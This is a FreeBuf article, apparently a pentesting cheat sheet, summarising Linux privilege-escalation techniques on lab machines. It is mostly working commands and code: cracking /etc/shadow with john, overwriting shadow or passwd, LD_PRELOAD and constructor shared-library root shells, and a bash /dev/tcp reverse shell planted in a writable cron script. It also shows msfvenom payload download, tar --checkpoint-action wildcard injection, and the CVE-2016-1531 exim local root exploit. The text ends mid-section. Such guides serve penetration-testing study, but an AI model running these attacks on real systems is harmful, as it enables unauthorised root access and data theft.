---
title: 红笔Linux提权总结（上）
url: https://www.freebuf.com/articles/network/421713.html
source: FreeBuf网络安全行业门户
date: 2025-02-14
fetch_date: 2025-10-06T20:35:58.647378
---

# 红笔Linux提权总结（上）

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

红笔Linux提权总结（上）

* ![]()
* 关注

* [基础安全](https://www.freebuf.com/articles/network)

红笔Linux提权总结（上）

2025-02-13 14:04:08

所属地 辽宁省

## 一、shadow和passwd利用

###### 1、可读shadow文件利用提权

```
$ cat /etc/shadow | grep ':\$' > hash	//提取普通用户和root的shadow保存到hash文件中
$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

###### 2、可写shadow文件利用提权（利用可写权限将root用户密码切换成自己的）

```
$ ls -liah /etc/shadow
785007 -rw-r--rw- 1 root shadow 1.5K 10月 7日 16:36 /etc/shadow
$ cp /etc/shadow /tmp/shadow.bak	//备份文件
$ hash-identifier '哈希值'		//先判断加密方式（可能不准,也可能识别不出）
$ mkpasswd -m 加密方式 密码	//利用mkpasswd生成加密的密码哈希值
再将可写的shadow文件中root的哈希值替换为我们生成的哈希值，登录root即可提权成功。
```

###### 3、可写passwd文件利用提权（直接将生成的哈希值写在占位符x的位置）

```
$ ls -liah /etc/passwd
787915 -rw-r--rw- 1 root root 3.1K 10月 7日 16:35 /etc/passwd
$ cp /etc/passwd /tmp/passwd.bak
$ openssl passwd 密码		//生成密码哈希（使用mkpasswd也可以）
再写到passwd中替换x，登录root即可提权成功。
```

## 二、sudo环境变量提权

```
$ sudo -l		//查看当前用户可以执行哪些系统命令
Matching Defaults entries for user on this host:
	env_reset, env_keep+=LD_PRELOAD
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD:/usr/bin/find
    (root)	NOPASSWD:/usr/bin/nano
    (root)	NOPASSWD:/usr/bin/vim
    (root)	NOPASSWD:/usr/bin/man
    (root)	NOPASSWD:/usr/bin/awk
    (root)	NOPASSWD:/usr/bin/less
    (root)	NOPASSWD:/usr/bin/ftp
    (root)	NOPASSWD:/usr/bin/nmap
    (root)	NOPASSWD:/usr/sbin/apache2
    (root)	NOPASSWD:/bin/more
```

env\_reset 表示重置环境变量，用sudo执行命令时把之前的环境变量清除。

env\_keep+=LD\_PRELOAD 在保持原有环境变量的同时，增加动态链接器，预加载共享库，有这个选项就可以用来提权。 LD为linker dynamic动态链接器，LD\_PRELOAD 是一个用于加载共享库的环境变量，通常在运行程序之前设置，以便在程序启动时预先加载指定的库。

```
$ vi shell.c	//定义一个共享库
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>

	//预加载，优先于main函数执行
    void _init() {
            unsetenv("LD_PRELOAD"); //只执行一次即可，所以把预加载环境卸掉
            setgid(0);
            setuid(0);
           	system("/bin/bash");

$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
//-fPIC：生成与位置无关的代码,允许共享库在内存中的任何位置加载和执行。-shared：生成一个共享库而不是可执行文件。-nostartfiles：不使用标准系统启动文件，用于自定义启动代码。

$ sudo LD_PRELOAD=./shell.so find	//利用find的sudo权限执行之前，预加载LD，从而提权。虽然在上述sudo -l的结果中，find本身就可以提权。
```

## 三、自动任务提权

###### 1、自动任务文件权限提权（利用可写权限构造反弹shell）

```
$ cat /etc/crontab 		//查看自动任务
    SHELL=/bin/sh
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    # m h dom mon dow user	command
    17*	***	root	cd / sg run-parts --report /etc/cron.hourly
    25 6	***	root	test -x /usr/sbin/anacron ll ( cd / sg run-parts --report /etc/cron.daily )
    47 6	**7	root	test -x /usr/sbin/anacron	l ( cd / sg run-parts --report /etc/cron.weekly )
    52 6	1**	root	test -x /usr/sbin/anacron ll ( cd / sg run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh

$ locate overwrite.sh
	/usr/local/bin/overwrite.sh

$ ls -liah /usr/local/bin/overwrite.sh
    816761 -rwxr--rw- 1 root staff 40 May 13 2017/usr/local/bin/overwrite.sh

$ cat /usr/local/bin/overwrite.sh
	#!/bin/bash
    echo`date` > /tmp/useless

$ nc -lvnp 端口	//监听端口，等待反弹shell连接

$ vim /usr/local/bin/overwrite.sh
	#!/bin/bash
    bash -i >& /dev/tcp/IP/端口 0>&1		//利用可写权限构造反弹shell
```

###### 2、自动任务PATH环境变量提权

```
$ cat /etc/crontab
    SHELL=/bin/sh
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
	* * * * * root overwrite.sh
	* * * * * root /usr/local/bin/compress.sh

$ locate overwrite.sh
	/usr/local/bin/overwrite.sh		//将overwrite.sh写入/home/user，即可优先执行。crontab使用自动任务中的路径，而不是用户自定义的路径。

$ cd /home/user
$ vim overwrite.sh
	#!/bin/bash
	cp /bin/bash /tmp/bash
	chmod +xs /tmp/bash

$ chmod +x overwrite.sh
$ /tmp/bash -p	 //过一分钟后，执行即可提权成功
```

###### 3、自动任务通配符提权

```
$ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *

在kali中
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.254 LPORT=4444 -f elf -o shell.elf	//生成一个反弹shell
# php -S 0:80

$ wget http://192.168.0.254/shell.elf	//在靶机中下载反弹shell
$ chmod +xs shell.elf

$ touch /home/user/--checkpoint=1
//--checkpoint是tar命令中启用检查点功能，使得 tar 在处理文件时定期输出进度信息。

$ touch /home/user/--checkpoint-action=exec=shell.elf  	//--checkpoint-action：定义在每个检查点发生时应执行的操作。exec=shell.elf：在检查点执行shell.elf。

在kali中监听4444端口，等待自动任务执行后，反弹shell连接到kali即可提权成功。
```

## 四、SUID提权

###### 1、SUID可执行文件已知利用提权（利用/usr/sbin/exim-4.84-3文件）

```
$ find /-perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/tmp/rootbash
/sbin/mount.nfs

利用exim-4.84-3
# searchsploit exim
    Exim 4.84-3 - Local Privilege Escalation          | linux/local/39535.sh

# cat 39535.sh
    #!/bin/sh
    # CVE-2016-1531 exim <= 4.84-3 local root exploit
    echo [ CVE-2016-1531 local root exploit
    cat > /tmp/root.pm << EOF
    package root;
    use strict;
    use warnings;
    system("/bin/sh");
    EOF
    PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps

下载到靶机上并执行即可提权成功
```

###### 2、SUID共享库注入提权（利用/usr/local/bin/suid-so文件）

```
$ strings /usr/local/bin/suid-so
    /lib64/ld-linux-x86-64.so.2
    #eGVO CyIk
    libdl.so.2
    __gmon_start__
    _Jv_RegisterClasses
    dlopen
    libstdc++.so.6
    _ZNSt8ios_base4InitD1Ev_ZNSolsEPFRSoS_E
    __gxx_personality_v0
    Calculating something, please wait ...
    /home/user/.config/libcalc.so
    Done.

//查看进程执行过程中出现的错误，并筛选出上面的路径相关的内容
$ strace /usr/local/bin/suid-so 2>&1 | grep '/home'
    open("/home/user/.config/libcalc.so",0 RDONLY)= -1 ENOENT (No such file or directory)

//当前目录为/home/user，并且没有.config目录及libcalc.so文件，所以可以自己创建对应的目录及文件，从而利用共享库文件提权。
$ ls -liah .config
	ls:cannot access .config: No such file or directory

$ mkdir .config
$ cd .config
$ vim libcalc.c
    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));
    // __attribute__((constructor))：GCC的扩展属性，在 main 函数之前自动调用该函数。

    void inject() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
    }

$ gcc -fPIC -shared -o libcalc.so libcalc.c		//生成共享库文件

$ /usr/local/bin/suid-so	//执行此文件即可提权成功
```

###### 3、SUID环境变量利用提权（利用/usr/local/bin/suid-env）

```
$ /usr/local/bin/suid-env
	Starting web server: apache2httpd(pid 1596)already running

$ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC 2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start	  //由于service没有用绝对路径，所以可以考虑环境变量劫持

$ vi service.c
    #include <stdio.h>
    #include <stdlib.h>

    void main(){
            setuid(0);
            setgid(0);
            system("/bin/bash -p");

$ gcc -o service service.c
$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

$ export PATH=.:$PATH	//将当前路径添加到环境变量
$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
...